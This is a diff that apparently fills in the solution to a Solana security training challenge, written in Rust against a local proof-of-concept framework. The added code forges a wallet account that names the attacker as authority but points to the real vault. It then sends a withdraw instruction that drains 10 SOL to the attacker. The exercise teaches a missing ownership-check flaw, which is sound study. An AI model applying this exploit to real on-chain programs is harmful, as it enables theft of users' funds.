@@ -1,5 +1,6 @@
 use std::{env, str::FromStr};
 
+use borsh::BorshSerialize;
 use owo_colors::OwoColorize;
 
 use poc_framework::solana_sdk::signature::Keypair;
@@ -8,8 +9,9 @@ use poc_framework::{
 };
 
 use pocs::assert_tx_success;
-use solana_program::native_token::lamports_to_sol;
-use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+use solana_program::instruction::{AccountMeta, Instruction};
+use solana_program::native_token::{lamports_to_sol, sol_to_lamports};
+use solana_program::{pubkey::Pubkey, system_program};
 
 struct Challenge {
     hacker: Keypair,
@@ -20,13 +22,49 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
-
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
     // Step 0: how much money do we want to steal?
+    let steal_amount = sol_to_lamports(10.0);
 
     // Step 1: a fake wallet with the same vault
+    let fake_wallet = level0::Wallet {
+        authority: challenge.hacker.pubkey(),
+        vault: challenge.vault_address,
+    };
+
+    let new_wallet = keypair(123);
+    env.create_account_with_data(&new_wallet, fake_wallet.try_to_vec().unwrap());
+
+    level0::withdraw(
+        challenge.wallet_program,
+        dbg!(challenge.hacker.pubkey()),
+        dbg!(challenge.hacker.pubkey()),
+        steal_amount,
+    );
 
     // Step 2: Use fake wallet to withdraw funds from the real vault to the attacker
+    let wallet_address = new_wallet.pubkey();
+
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[Instruction {
+                program_id: challenge.wallet_program,
+                accounts: vec![
+                    AccountMeta::new(wallet_address, false),
+                    AccountMeta::new(challenge.vault_address, false),
+                    AccountMeta::new(challenge.hacker.pubkey(), true),
+                    AccountMeta::new(challenge.hacker.pubkey(), false),
+                    AccountMeta::new(system_program::id(), false),
+                ],
+                data: level0::WalletInstruction::Withdraw {
+                    amount: steal_amount,
+                }
+                .try_to_vec()
+                .unwrap(),
+            }],
+            &[&challenge.hacker],
+        ),
+    );
 }
 
 /*
